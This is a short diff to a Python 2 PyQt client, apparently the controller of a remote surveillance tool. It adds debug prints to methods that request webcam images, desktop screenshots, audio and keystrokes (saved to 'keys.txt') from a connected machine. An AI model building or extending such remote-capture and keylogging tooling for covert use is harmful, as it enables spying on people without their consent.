@@ -256,6 +256,7 @@ class Client(QtGui.QMainWindow):
 		return response
 
 	def requestImage(self):
+		print 'Request Image'
 		t = UpdateImage(self.__server_connected, self.__manager, self)
 		QtCore.QObject.connect(t, QtCore.SIGNAL(_fromUtf8("update()")), self.streamImage)
 		t.start()
@@ -263,6 +264,7 @@ class Client(QtGui.QMainWindow):
 	def streamImage(self):
 		self.setImageWebCam(SAVEDIR + 'image.jpg')
 	def requestDisplay(self):
+		print 'Request Desktop'
 		t = UpdateDesktop(self.__server_connected, self.__manager, self)
 		QtCore.QObject.connect(t, QtCore.SIGNAL(_fromUtf8("update()")), self.streamDisplay)
 		t.start()
@@ -271,6 +273,7 @@ class Client(QtGui.QMainWindow):
 		self.setImageDesktop(SAVEDIR + 'display.png')
 		
 	def requestAudio(self, size = 1024 * 10):
+		print 'Request Audio'
 		t = UpdateAudio(self.__server_connected,size,  self.__manager, self)
 		QtCore.QObject.connect(t, QtCore.SIGNAL(_fromUtf8("update()")), self.streamAudio)
 		t.start()
@@ -280,6 +283,7 @@ class Client(QtGui.QMainWindow):
 		t.start()
 		
 	def requestKeyboard(self, size = 40):
+		print 'Request Keyboard'
 		open(SAVEDIR + "keys.txt", "w")
 		t = UpdateKeyboard(self.__server_connected,size , self.__manager, self)
 		QtCore.QObject.connect(t, QtCore.SIGNAL(_fromUtf8("update()")), self.streamKeyboard)
